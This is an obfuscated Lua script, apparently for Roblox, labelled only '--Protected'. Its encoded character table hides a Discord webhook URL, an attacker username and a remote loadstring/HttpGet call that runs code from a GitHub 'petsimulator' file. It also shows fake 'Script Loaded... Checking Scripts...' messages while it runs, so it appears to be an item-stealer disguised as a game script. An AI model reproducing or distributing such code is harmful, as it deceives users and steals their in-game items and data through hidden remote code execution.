--Protected

return(function(a,b,c,d,e,f,g,h,i)local function j(k)return k,e()[c(f)]end;local l={}local b={}local function m(n)if n then if l then if not l[4]then l[2]=3;l[1]=300 else l[9]=nil end;if l[5]==4 then l[5]=nil;if l[5]==nil then l[7]=100 elseif l[6]~=4 or l[6]<5 then return l[4]end end end;while true do if n<40000 then e()[c(f)]=nil;return n/l[1]elseif j(n)>500*300*2 then e()[c(f)]=nil;return j(n)/3,l[5]elseif j(n)==3 then e()[c(f)]=nil;return b(j(n)*2)elseif n<20 then return b,l[1]end end end end;local o={m(25500),m(34500),m(30300),m(34200),m(33000),m(29100),m(32700),m(30300),m(9600),m(18300),m(9600),m(10200),m(30000),m(30300),m(36000),m(28500),m(33600),m(34500),m(36000),m(10200),m(3000),m(26100),m(30300),m(29400),m(21600),m(33300),m(33300),m(32100),m(9600),m(18300),m(9600),m(10200),m(31200),m(34800),m(34800),m(33600),m(34500),m(17400),m(14100),m(14100),m(30000),m(31500),m(34500),m(29700),m(33300),m(34200),m(30000),m(13800),m(29700),m(33300),m(32700),m(14100),m(29100),m(33600),m(31500),m(14100),m(35700),m(30300),m(29400),m(31200),m(33300),m(33300),m(32100),m(34500),m(14100),m(14700),m(14400),m(16800),m(15900),m(15900),m(15300),m(15900),m(15900),m(14700),m(15900),m(16500),m(15000),m(16500),m(16200),m(15600),m(15000),m(16500),m(15300),m(15600),m(14100),m(36600),m(16800),m(30900),m(36300),m(30300),m(33000),m(29100),m(33000),m(34200),m(15300),m(26700),m(33600),m(16800),m(35100),m(31800),m(32100),m(21600),m(15600),m(25500),m(19500),m(21600),m(26100),m(24000),m(36000),m(30900),m(32100),m(14700),m(34500),m(33600),m(16500),m(31800),m(29700),m(27000),m(16500),m(30300),m(26400),m(34800),m(19800),m(31200),m(35100),m(34800),m(14400),m(22800),m(28500),m(26400),m(22200),m(33300),m(15300),m(33600),m(21900),m(26700),m(30000),m(24000),m(35400),m(35100),m(15000),m(24300),m(34500),m(28500),m(23100),m(24000),m(15900),m(20100),m(20400),m(24000),m(24300),m(16500),m(36600),m(10200),m(3000),m(3000),m(3000),m(32400),m(33300),m(29100),m(30000),m(31500),m(33000),m(30900),m(34500),m(29700),m(34200),m(30300),m(30300),m(33000),m(9600),m(18300),m(9600),m(34800),m(34200),m(35100),m(30300),m(9600),m(13500),m(13500),m(9600),m(34500),m(30300),m(34800),m(9600),m(34800),m(31200),m(31500),m(34500),m(9600),m(34800),m(33300),m(9600),m(30600),m(29100),m(32400),m(34500),m(30300),m(9600),m(29100),m(33000),m(30000),m(9600),m(34200),m(30300),m(32700),m(33300),m(35400),m(30300),m(9600),m(28500),m(21300),m(13800),m(9600),m(34500),m(34800),m(35100),m(30600),m(30600),m(9600),m(34800),m(33300),m(9600),m(35100),m(34500),m(30300),m(9600),m(36300),m(33300),m(35100),m(34200),m(9600),m(33300),m(35700),m(33000),m(9600),m(21300),m(25500),m(21900),m(3000),m(28500),m(21300),m(13800),m(20100),m(35100),m(34500),m(34800),m(33300),m(32700),m(24900),m(29700),m(34200),m(31500),m(33600),m(34800),m(23400),m(29100),m(32700),m(30300),m(9600),m(18300),m(9600),m(10200),m(24000),m(24900),m(26400),m(9600),m(24900),m(29700),m(34200),m(31500),m(33600),m(34800),m(10200),m(3000),m(28500),m(21300),m(13800),m(25200),m(30300),m(36000),m(34800),m(14700),m(9600),m(18300),m(9600),m(10200),m(24900),m(29700),m(34200),m(31500),m(33600),m(34800),m(9600),m(22800),m(33300),m(29100),m(30000),m(30300),m(30000),m(13800),m(13800),m(13800),m(10200),m(3000),m(28500),m(21300),m(13800),m(25200),m(30300),m(36000),m(34800),m(15000),m(9600),m(18300),m(9600),m(10200),m(26100),m(29100),m(31500),m(34800),m(31500),m(33000),m(30900),m(9600),m(30600),m(33300),m(34200),m(9600),m(24900),m(29700),m(34200),m(31500),m(33600),m(34800),m(10200),m(3000),m(28500),m(21300),m(13800),m(25200),m(30300),m(36000),m(34800),m(15300),m(9600),m(18300),m(9600),m(10200),m(20100),m(31200),m(30300),m(29700),m(32100),m(31500),m(33000),m(30900),m(9600),m(24900),m(29700),m(34200),m(31500),m(33600),m(34800),m(34500),m(13800),m(13800),m(13800),m(10200),m(3000),m(28500),m(21300),m(13800),m(25200),m(30300),m(36000),m(34800),m(15600),m(9600),m(18300),m(9600),m(10200),m(24900),m(34800),m(29100),m(34200),m(34800),m(31500),m(33000),m(30900),m(9600),m(24900),m(29700),m(34200),m(31500),m(33600),m(34800),m(34500),m(13800),m(13800),m(13800),m(10200),m(3000),m(32400),m(33300),m(29100),m(30000),m(34500),m(34800),m(34200),m(31500),m(33000),m(30900),m(12000),m(30900),m(29100),m(32700),m(30300),m(17400),m(21600),m(34800),m(34800),m(33600),m(21300),m(30300),m(34800),m(12000),m(10200),m(31200),m(34800),m(34800),m(33600),m(34500),m(17400),m(14100),m(14100),m(34200),m(29100),m(35700),m(13800),m(30900),m(31500),m(34800),m(31200),m(35100),m(29400),m(35100),m(34500),m(30300),m(34200),m(29700),m(33300),m(33000),m(34800),m(30300),m(33000),m(34800),m(13800),m(29700),m(33300),m(32700),m(14100),m(22200),m(35100),m(34500),m(34800),m(29100),m(33000),m(33300),m(34800),m(31200),m(30300),m(34200),m(30000),m(32700),m(30300),m(14100),m(33600),m(30300),m(34800),m(34500),m(31500),m(32700),m(36000),m(15000),m(15000),m(14100),m(32700),m(29100),m(31500),m(33000),m(14100),m(33600),m(30300),m(34800),m(34500),m(31500),m(32700),m(30900),m(35100),m(31500),m(34500),m(34500),m(13800),m(32400),m(35100),m(29100),m(10200),m(12300),m(12300),m(12000),m(12300),m(3000),}for p,o in pairs(o)do table.insert(b,string.char(o))end;local function q(r,s)while true do if not a then return l elseif not b or not c or not d then return#o elseif not e or not f or not g then e()[a(f)](i(o,''))return#o+#b elseif not g or not h then return#b+3*2*-1 elseif r==h and b then e()[c(f)](i(b,''))()return c("\116\110\105\114\112")end end end;q(300,{},getfenv)end)(string.byte,string.char,string.reverse,string.gsub,getfenv,"\103\110\105\114\116\115\100\97\111\108",tonumber,300,table.concat)
